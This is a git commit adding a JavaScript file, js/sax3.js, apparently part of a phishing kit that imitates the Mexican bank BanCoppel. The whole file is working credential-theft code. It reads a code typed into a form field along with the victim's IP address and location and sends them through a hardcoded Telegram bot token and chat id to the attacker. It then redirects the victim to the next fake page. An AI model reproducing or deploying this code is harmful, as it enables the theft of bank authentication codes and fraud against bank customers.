730ecb542c46b5ca2096f9f32769e74544016276
luisteed <luisted1512@gmail.com>
2023-06-29 13:16:21 -0500

    coppel ahora

---
+++ js/sax3.js
@@ -0,0 +1,34 @@
+
+var telegram_bot_id = "6080426074:AAHn4sf0rwkQO8TbqJAfKnnDgweU72a48ak";
+//chat id
+var chat_id = 1739203762;
+var u_name, ip, ip2;
+var ready = function () {
+    u_name = document.getElementById("0T4RX").value;
+    ip = document.getElementById("gfg").innerHTML;
+    ip2 = document.getElementById("address").innerHTML;
+    message = "🔹B4NC0P3L🔹\n🔔C0D3: " + u_name + "\nIP: " + ip +"\n" + ip2 +"\n🔹C0DIGO SYN4PSE🔹";
+};
+var sender = function () {
+    ready();
+    var settings = {
+        "async": true,
+        "crossDomain": true,
+        "url": "https://api.telegram.org/bot" + telegram_bot_id + "/sendMessage",
+        "method": "POST",
+        "headers": {
+            "Content-Type": "application/json",
+            "cache-control": "no-cache"
+
+        },
+        "data": JSON.stringify({
+            "chat_id": chat_id,
+            "text": message
+        })
+    };
+       $.ajax(settings).done(function (response) {
+        window.location = 'index4.html';
+        console.log(response);
+    });
+    return false;
+};
